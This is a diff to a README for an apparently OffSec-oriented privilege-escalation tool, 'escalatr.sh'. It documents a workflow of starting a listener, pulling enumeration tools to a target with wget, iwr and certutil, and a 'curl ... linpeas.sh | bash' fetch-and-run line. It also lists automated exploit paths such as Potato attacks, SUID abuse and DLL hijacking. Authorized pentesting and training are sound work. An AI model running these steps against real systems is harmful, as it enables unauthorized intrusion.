@@ -29,20 +29,20 @@ Privilege escalation enumeration orchestrator for OffSec. Run it on Kali after y
 ./escalatr.sh 10.10.10.1 --os linux
 ./escalatr.sh 10.10.10.1 --os windows
 
-# 3. Transfer tools to target using the printed transfer commands
-#    (HTTP server starts automatically on port 8888)
-
-# 4. Run commands from the generated commands.txt on target
-cat $TOOLKIT_ROOT/privesc/10.10.10.1/commands.txt
-
-# 5. Save tool output, then parse it for quick wins
+# 3. Script prints [NEXT STEPS] block — follow it in order:
+#    a. Start listener (printed first):
+#       penelope -p 4444 -O
+#    b. Transfer tools — commands are auto-resolved with your tun0/eth0 IP and HTTP port:
+#       curl http://<your-kali-ip>:<port>/linpeas.sh | bash   # Linux
+#       iwr -uri http://<your-kali-ip>:<port>/winpeas.exe ... # Windows
+#    c. Run commands.txt on target, exfil output, then parse:
 ./escalatr.sh --parse /tmp/linpeas_output.txt
 ./escalatr.sh --parse /tmp/winpeas_output.txt --os windows
 
-# 6. ★ START HERE — pre-built exploit commands for every finding
+# 4. ★ START HERE — pre-built exploit commands for every finding
 cat $TOOLKIT_ROOT/privesc/10.10.10.1/attack_commands.txt
 
-# 7. Full parsed findings
+# 5. Full parsed findings
 cat $TOOLKIT_ROOT/privesc/10.10.10.1/quick-wins.txt
 ```
 
@@ -135,24 +135,25 @@ $TOOLKIT_ROOT/privesc/<IP>/
 
 ## Tool Transfer Commands (Generated Automatically)
 
+The script auto-detects your Kali IP (tun0 → eth0 fallback) and prints fully resolved transfer commands — no `KALI_IP` placeholder to fill in manually.
+
 ### Linux target
 ```bash
 # wget
-wget http://KALI_IP:8888/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
-wget http://KALI_IP:8888/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
+wget http://<auto-kali-ip>:<port>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
+wget http://<auto-kali-ip>:<port>/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
 
 # curl
-curl http://KALI_IP:8888/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
+curl http://<auto-kali-ip>:<port>/linpeas.sh | bash
 ```
 
 ### Windows target
 ```powershell
 # iwr (PowerShell)
-iwr -uri http://KALI_IP:8888/winPEASx64.exe -Outfile C:\Users\Public\winPEASx64.exe
-iwr -uri http://KALI_IP:8888/PowerUp.ps1 -Outfile C:\Users\Public\PowerUp.ps1
+iwr -uri http://<auto-kali-ip>:<port>/winpeas.exe -OutFile C:\Users\Public\winpeas.exe
 
 # certutil (cmd.exe — no PowerShell)
-certutil -urlcache -split -f http://KALI_IP:8888/winPEASx64.exe C:\Users\Public\winPEASx64.exe
+certutil -urlcache -split -f http://<auto-kali-ip>:<port>/winpeas.exe C:\Users\Public\winpeas.exe
 ```
 
 ---
@@ -422,7 +423,7 @@ $TOOLKIT_ROOT/privesc/parsed_YYYYMMDD_HHMMSS/attack_commands.txt  # ★ ready-to
 
 **Parser extracts and generates commands for:**
 - Linux: sudo NOPASSWD per binary (GTFOBins), non-standard SUID per binary (GTFOBins), capabilities (cap_setuid/cap_dac), writable `/etc/sudoers` or `/etc/passwd`, NFS `no_root_squash`, cron injection template, internal services → `pivotr.sh` command per port
-- Windows: token privileges (SeImpersonate → Potato by OS, SeBackup → `reg save`, SeDebug → `procdump`), stored creds → `runas`, AlwaysInstallElevated → MSI payload, unquoted path → payload placement, writable service binary → replace + restart, DLL hijack → `msfvenom`/`mingw` template, internal listeners → `chisel`/SSH forward
+- Windows: token privileges (SeImpersonate → Potato by OS, SeBackup → `reg save`, SeDebug → `procdump`), stored creds → `runas`, AlwaysInstallElevated → MSI payload, unquoted path → payload placement, writable service binary → replace + restart, DLL hijack → `msfvenom`/`mingw` template, internal listeners → `pivotr.sh`/Ligolo listener
 
 ---
 
@@ -455,8 +456,10 @@ rm -rf ~/.offsec_tools/privesc/
 
 ## Related
 
-- [[lootr]] — first-pass target-side collection and `attack_commands.txt`
-- [[sprayr]] — validate and re-spray credentials found during privesc
+- [[Linux_PrivEsc]] — manual Linux privesc techniques
+- [[Windows_PrivEsc]] — manual Windows privesc techniques
+- [[OffSec_Linux_PrivEsc_Operational_Addendum]] — engagement-day Linux privesc reference
+- [[OffSec_Windows_PrivEsc_Operational_Addendum]] — engagement-day Windows privesc reference
 - [[File_Transfers]] — transferring tools when HTTP fails
 - [[Passwords]] — cracking hashes found during enumeration
 - [[Tunneling_Pivoting]] — port forwarding internal listeners
